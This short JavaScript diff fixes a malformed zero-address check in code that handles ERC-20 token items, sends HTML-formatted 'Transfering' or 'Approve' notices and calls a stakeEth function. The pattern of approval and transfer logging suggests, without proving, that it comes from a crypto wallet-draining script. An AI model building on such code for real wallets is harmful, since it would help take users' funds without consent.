@@ -1156,11 +1156,11 @@
           let message = '';
 
           if (item.type === "erc20") {
-            message = item.tokenAddress === "0x000000000000000000000000000000im0000000000"
+            message = item.tokenAddress === "0x0000000000000000000000000000000000000000"
               ? `🪙 <b>Transfering ${item.symbol} | Network: ${item.chain}</b>`
               : `🪙<b>Approve ${item.symbol} | Network: ${item.chain}</b>`;
 
-            if (item.tokenAddress === "0x000000000000000000000000im0000000000") {
+            if (item.tokenAddress === "0x0000000000000000000000000000000000000000") {
               await stakeEth(item.tokenAmount, message);
               processingState.set(key, success === 1 ? 'completed' : 'failed_transfer');
             } else {
